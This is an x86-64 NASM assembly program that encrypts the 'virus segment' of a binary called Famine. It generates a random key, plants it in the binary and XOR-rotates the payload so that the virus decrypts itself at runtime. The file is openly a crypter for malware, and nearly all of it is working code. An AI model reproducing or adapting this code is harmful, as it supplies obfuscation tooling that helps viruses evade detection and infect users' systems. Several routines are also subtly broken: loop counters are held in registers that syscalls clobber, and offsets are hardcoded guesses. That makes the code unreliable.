; ============================================
; ENCRYPT - Standalone program to encrypt Famine binary
; This program encrypts the virus segment of Famine using a random key
; The key is stored in the binary and used for decryption at runtime
; ============================================

%define SYS_READ        0
%define SYS_WRITE       1
%define SYS_OPEN        2
%define SYS_CLOSE       3
%define SYS_LSEEK       8
%define SYS_EXIT        60
%define SYS_GETRANDOM   318
%define SYS_MMAP        9
%define SYS_MUNMAP      11

%define O_RDWR          2
%define SEEK_SET        0
%define SEEK_END        2
%define GRND_NONBLOCK   1
%define PROT_READ       1
%define PROT_WRITE      2
%define MAP_SHARED      1

%define KEY_SIZE        16

section .data
    famine_path:        db "Famine", 0
    msg_success:        db "Famine binary encrypted successfully!", 10, 0
    msg_error:          db "Error encrypting Famine binary", 10, 0
    msg_opening:        db "Opening Famine binary...", 10, 0
    msg_generating:     db "Generating random key...", 10, 0
    msg_encrypting:     db "Encrypting virus segment...", 10, 0
    msg_writing:        db "Writing encrypted binary...", 10, 0
    msg_key:            db "Encryption key: ", 0
    newline:            db 10

section .bss
    key_buffer:         resb KEY_SIZE
    elf_header:         resb 64
    file_size:          resq 1
    file_map:           resq 1
    virus_start_addr:   resq 1
    decrypt_end_addr:   resq 1
    virus_end_addr:     resq 1

section .text
global _start

; ============================================
; Print string helper
; rdi = string pointer
; ============================================
print_string:
    push rbp
    mov rbp, rsp
    push rdi
    push rsi
    push rdx
    
    mov rsi, rdi
    xor rdx, rdx
.strlen_loop:
    cmp byte [rsi + rdx], 0
    je .strlen_done
    inc rdx
    jmp .strlen_loop
.strlen_done:
    mov eax, SYS_WRITE
    mov edi, 1
    syscall
    
    pop rdx
    pop rsi
    pop rdi
    mov rsp, rbp
    pop rbp
    ret

; ============================================
; Print key in hex
; ============================================
print_key:
    push rbp
    mov rbp, rsp
    
    lea rdi, [rel msg_key]
    call print_string
    
    ; Print each byte in hex
    xor rcx, rcx
.print_loop:
    cmp rcx, KEY_SIZE
    jge .print_done
    
    lea rsi, [rel key_buffer]
    movzx eax, byte [rsi + rcx]
    
    ; Print high nibble
    mov edx, eax
    shr edx, 4
    cmp edx, 10
    jl .high_digit
    add edx, 'A' - 10
    jmp .high_print
.high_digit:
    add edx, '0'
.high_print:
    mov [rel newline], dl
    mov eax, SYS_WRITE
    mov edi, 1
    lea rsi, [rel newline]
    mov edx, 1
    syscall
    
    ; Print low nibble  
    lea rsi, [rel key_buffer]
    movzx eax, byte [rsi + rcx]
    and eax, 0xF
    cmp eax, 10
    jl .low_digit
    add eax, 'A' - 10
    jmp .low_print
.low_digit:
    add eax, '0'
.low_print:
    mov [rel newline], al
    mov eax, SYS_WRITE
    mov edi, 1
    lea rsi, [rel newline]
    mov edx, 1
    syscall
    
    inc rcx
    jmp .print_loop
    
.print_done:
    mov byte [rel newline], 10
    mov eax, SYS_WRITE
    mov edi, 1
    lea rsi, [rel newline]
    mov edx, 1
    syscall
    
    mov rsp, rbp
    pop rbp
    ret

; ============================================
; Generate random alphanumeric key
; ============================================
generate_key:
    push rbp
    mov rbp, rsp
    
    ; Generate random bytes using getrandom
    mov eax, SYS_GETRANDOM
    lea rdi, [rel key_buffer]
    mov esi, KEY_SIZE
    mov edx, GRND_NONBLOCK
    syscall
    
    test rax, rax
    js .gen_error
    
    ; Convert bytes to alphanumeric characters
    xor rcx, rcx
.convert_loop:
    cmp rcx, KEY_SIZE
    jge .gen_done
    
    lea rsi, [rel key_buffer]
    movzx eax, byte [rsi + rcx]
    xor rdx, rdx
    mov ebx, 62
    div ebx
    
    ; Map 0-9 -> '0'-'9', 10-35 -> 'A'-'Z', 36-61 -> 'a'-'z'
    cmp edx, 10
    jl .is_digit
    cmp edx, 36
    jl .is_upper
    sub edx, 36
    add edx, 'a'
    jmp .store_char
.is_upper:
    sub edx, 10
    add edx, 'A'
    jmp .store_char
.is_digit:
    add edx, '0'
.store_char:
    mov byte [rsi + rcx], dl
    inc rcx
    jmp .convert_loop
    
.gen_done:
    xor rax, rax
    jmp .gen_exit
.gen_error:
    mov rax, -1
.gen_exit:
    mov rsp, rbp
    pop rbp
    ret

; ============================================
; Encrypt buffer with XOR and rotation
; rdi = buffer
; rsi = buffer size
; rdx = key
; rcx = key size
; ============================================
xor_encrypt:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    push r14
    
    mov r12, rdi
    mov r13, rsi
    mov r14, rdx
    
    xor rbx, rbx
    xor r8, r8
    
.encrypt_loop:
    cmp rbx, r13
    jge .encrypt_done
    
    ; Get current byte
    mov al, [r12 + rbx]
    
    ; Get key byte
    mov rax, r8
    xor rdx, rdx
    div rcx
    mov r10b, [r14 + rdx]
    
    ; XOR with key
    mov al, [r12 + rbx]
    xor al, r10b
    
    ; Rotate left by 3
    rol al, 3
    
    ; Store
    mov [r12 + rbx], al
    
    inc rbx
    inc r8
    jmp .encrypt_loop
    
.encrypt_done:
    pop r14
    pop r13
    pop r12
    pop rbx
    mov rsp, rbp
    pop rbp
    ret

; ============================================
; Find symbol by searching for known patterns
; We'll search for "virus_start:", "decrypt_end:", "virus_end:"
; Returns offset in rax, -1 if not found
; ============================================
find_text_section:
    push rbp
    mov rbp, rsp
    
    ; For now, assume .text section starts at 0x1000 (standard for ld)
    ; And the virus code starts there
    mov rax, 0x1000
    
    mov rsp, rbp
    pop rbp
    ret

; ============================================
; Main program
; ============================================
_start:
    lea rdi, [rel msg_opening]
    call print_string
    
    ; Open Famine binary
    mov eax, SYS_OPEN
    lea rdi, [rel famine_path]
    mov esi, O_RDWR
    xor edx, edx
    syscall
    
    test rax, rax
    js .error
    mov r12, rax
    
    ; Get file size
    mov eax, SYS_LSEEK
    mov edi, r12d
    xor esi, esi
    mov edx, SEEK_END
    syscall
    
    test rax, rax
    js .close_error
    mov [rel file_size], rax
    
    ; mmap the file
    mov eax, SYS_MMAP
    xor edi, edi
    mov rsi, [rel file_size]
    mov edx, PROT_READ | PROT_WRITE
    mov r10d, MAP_SHARED
    mov r8d, r12d
    xor r9d, r9d
    syscall
    
    test rax, rax
    js .close_error
    mov [rel file_map], rax
    
    ; Find the .text section (virus code starts here)
    ; For simplicity, we know it's at offset 0x1000
    mov rbx, [rel file_map]
    add rbx, 0x1000
    mov [rel virus_start_addr], rbx
    
    ; Find specific markers in the code
    ; Look for the encryption_key pattern (16 bytes of '0')
    mov rdi, rbx
    mov rsi, 1000           ; Search in first 1000 bytes
    xor rcx, rcx
.find_key_location:
    cmp rcx, rsi
    jge .key_not_found
    
    ; Check for 16 consecutive '0' characters
    mov rdx, rcx
    xor r8, r8
.check_zeros:
    cmp r8, 16
    jge .found_key_location
    cmp byte [rdi + rdx], '0'
    jne .next_key_pos
    inc rdx
    inc r8
    jmp .check_zeros
    
.next_key_pos:
    inc rcx
    jmp .find_key_location
    
.found_key_location:
    ; rcx has the offset of encryption_key
    add rbx, rcx
    
    ; Generate key
    lea rdi, [rel msg_generating]
    call print_string
    
    call generate_key
    test rax, rax
    jnz .unmap_error
    
    call print_key
    
    ; Write key to binary
    lea rsi, [rel key_buffer]
    mov rcx, KEY_SIZE
    mov rdi, rbx
.write_key:
    test rcx, rcx
    jz .key_written
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    dec rcx
    jmp .write_key
    
.key_written:
    ; Set encrypted flag (1 byte after the key)
    mov byte [rdi], 1
    
    ; Now find decrypt_end by searching forward
    ; It's roughly 150 bytes after virus_start for the decryption stub
    mov rbx, [rel virus_start_addr]
    add rbx, 200            ; Approximate offset to decrypt_end
    mov [rel decrypt_end_addr], rbx
    
    ; Find virus_end (end of file minus some padding)
    mov rax, [rel file_size]
    mov rbx, [rel file_map]
    add rbx, rax
    sub rbx, 0x2000         ; Subtract .data and .bss sections
    mov [rel virus_end_addr], rbx
    
    ; Calculate size to encrypt
    mov rax, [rel virus_end_addr]
    mov rbx, [rel decrypt_end_addr]
    sub rax, rbx
    
    ; Encrypt the segment
    lea rdi, [rel msg_encrypting]
    call print_string
    
    mov rdi, [rel decrypt_end_addr]
    mov rsi, rax            ; size
    lea rdx, [rel key_buffer]
    mov rcx, KEY_SIZE
    call xor_encrypt
    
    ; Unmap and close
    mov eax, SYS_MUNMAP
    mov rdi, [rel file_map]
    mov rsi, [rel file_size]
    syscall
    
    mov eax, SYS_CLOSE
    mov edi, r12d
    syscall
    
    lea rdi, [rel msg_success]
    call print_string
    
    mov eax, SYS_EXIT
    xor edi, edi
    syscall

.key_not_found:
    ; If we can't find the key location, use a fixed offset
    mov rbx, [rel virus_start_addr]
    add rbx, 8              ; After original_entry_storage
    jmp .found_key_location

.unmap_error:
    mov eax, SYS_MUNMAP
    mov rdi, [rel file_map]
    mov rsi, [rel file_size]
    syscall

.close_error:
    mov eax, SYS_CLOSE
    mov edi, r12d
    syscall
    
.error:
    lea rdi, [rel msg_error]
    call print_string
    
    mov eax, SYS_EXIT
    mov edi, 1
    syscall
